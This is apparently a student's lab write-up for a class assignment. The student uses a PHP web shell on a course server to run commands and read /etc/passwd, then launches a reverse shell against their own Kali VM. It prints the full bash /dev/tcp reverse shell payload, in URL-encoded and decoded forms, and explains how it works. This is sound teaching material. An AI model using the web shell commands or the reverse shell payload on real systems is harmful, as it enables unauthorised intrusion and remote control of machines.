# Reverse shell assignment

Author: James Commons

Date: 10/30/2024

## Part 1: installing a PHP web shell

a. I used the PHP web shell provided on the assignment page. The web shell is written so that
it can take as an input a URL parameter and run it as a command locally on the server the file
is installed on. This means that the only thing I need to do to get the server to run a command
is give the command I want in the URL. For `whoami`, I typed 
`http://danger.jeffondich.com/uploadedimages/commonsj-webshell.php?command=whoami` into my browser's
search bar, and it responded with the plain text `www-data`. On a more fundamental level, this works
because when a user tries to visit a page written in PHP, arbitrary scripting code embedded in the
page is run locally on the server before HTML is sent to the user.

b. The `<pre>` tags are necessary for the browser to display the command output as plain text rather
than formatted text. If the tags were not there, line feeds would be ignored, the font would not be
monospace, and in general, it would be hard to interpret text meant to be read from a terminal.

## Part 2: looking around

a. `/var/www/danger.jeffondich.com`. This can be found using the command `pwd`.

b. 
The full list of users is given in the file /etc/passwd, which I 
was able to list out by running `cat \etc\*passwd` (not entirely sure why the * is necessary here,
so shout out Kendra). Here is the list:

root,
daemon,
bin,
sys,
sync,
games,
man,
lp,
mail,
news,
uucp,
proxy,
www-data,
backup,
list,
irc,
gnats,
nobody,
systemd-network,
systemd-resolve,
messagebus,
systemd-timesync,
syslog,
_apt,
tss,
uuidd,
tcpdump,
usbmux,
sshd,
pollinate,
landscape,
fwupd-refresh,
jeff,
postgres,
bullwinkle

c. Any user can read from `/etc/passwd`, but only root can modify the file. You can
verify this by listing the permissions in the `/etc/` directory. The file contains 
a list of every user and some basic preferences like the location of the home directory
and the path to the user's preferred shell.

d. `/etc/shadow` can only by read by root, and it contains hashed and salted passwords
for each user. It also contains information about things like password expiration dates 
([source](https://www.cyberciti.biz/faq/understanding-etcshadow-file/)).

e. 
```
/   \          /   \
\_   \        /  __/
 _\   \      /  /__
 \___  \____/   __/
     \_       _/
       | @ @  \_
       |
     _/     /\
    /o)  (o/\ \_
    \_____/ /
      \____/
```
This moose was found in a file in the /home/jeff/ directory. I also found a file called 
youfoundme.txt that you can read the contents of.

I found this frog at /var/www/danger.jeffondich.com/secrets/kindasecret.txt
```
 _   _
           (.)_(.)
        _ (   _   ) _
       / \/`-----'\/ \
     __\ ( (     ) ) /__
     )   /\ \._./ /\   (
      )_/ /|\   /|\ \_(
```

I found these birds at /var/www/danger.jeffondich.com/youwontfindthiswithgobuster/secret.txt
```
 ___     ___
  (o o)   (o o)
 (  V  ) (  V  ) 
/--m-m- /--m-m-
```

"Aw, a little period couldn't hide me? So sad." Yup (found at /opt/.even-more-secrets.txt).

Finally, I found a PHP file called my_ip.php, which when I visit it at 
`http://danger.jeffondich.com/my_ip.php`, gives me the IP address I used to contact the 
server. In this case, it gave me one of Carleton's gateway IP addresses.

## Part 3: setup for part 4

Completed.

## Part 4: launching a reverse shell

a. To find the IP address of the target (my Kali VM), I ran the command `ifconfig` on the VM. It 
told me that the IP address is `192.168.64.8`. If I were an attacker without access
to the machine yet, I would still presumably know the IP address of the target, most likely
because it is associated with some domain that I can look up. Since we are using a web shell, 
the target is likely a web server, meaning that the IP address is not meant to be kept secret.

b. My computer has the IP address of `192.168.64.1` as far as my Kali VM is concerned. However,
on Carleton's network, my IP address is `10.133.23.56` at the moment. The reason for the 
discrepancy is that my computer is acting as a sort of gateway to Carleton's larger network.
My computer is hosting a local network that my VM is connected to. My computer forwards
requests made by my VM to one of Carleton's gateway devices. For the reverse shell, I should
use `192.168.64.1`, since the other IP address is not known to my VM.

c. I picked the port 5678.

d. This is the template URL given on the assignement page: 
`http://KALI_IP/YOUR_WEBSHELL.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/YOUR_HOST_OS_IP/YOUR_CHOSEN_PORT%200%3E%261%22`.
I will modify it to be 
`http://192.168.64.8/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.64.1/5678%200%3E%261%22`.

e. Yes! It all works. To find out information about the system I have just hacked into,
I can run `uname -a` in my reverse shell (netcat input). When I do this, I get 
`Linux jello 6.6.15-arm64 #1 SMP Kali 6.6.15-2kali1 (2024-05-17) aarch64 GNU/Linux`, which
confirms that the target machine in running Kali linux compiled for arm64 machines.

f. Those codes are URL escape sequences. For example, I know off the top of my head that `%20` is 
the code for the space character. Using a URL decoder, I can rewrite the URL used in part d as
follows: `http://192.168.64.8/webshell.php?command=bash -c "bash -i >& /dev/tcp/192.168.64.1/5678 0>&1"`

g. To understand how this reverse shell works, we need to understand the command I ran on the target
machine using the web shell. The first command is `bash -c`, followed by an argument. This just invokes
the bash shell to run the command given in the argument. It is a way of enforcing that our command is
actually interpreted as a bash command. It is necessary because we are ultimately trying to run this
code through a PHP script, and I assume this is the workaround you have to do get bash to run. I tried
it without this first command (just running the stuff in quotes), and it didn't work.

The next thing that runs is the command encased in quotes: `bash -i >& /dev/tcp/192.168.64.1/5678 0>&1`.
This invokes the bash shell again, this time with the option `-i`, which sets everything up for an 
interactive session. Finally, the real magic happens when we redirect stdout and stderr to the "file"
`/dev/tcp/192.168.64.1/5678`. What this actually does is it opens a tcp connection to `192.168.64.1` on
port `5678`. The final piece of this command is redirecting stdin to stdout. This lets us input commands
into the reverse shell from the attacking machine.
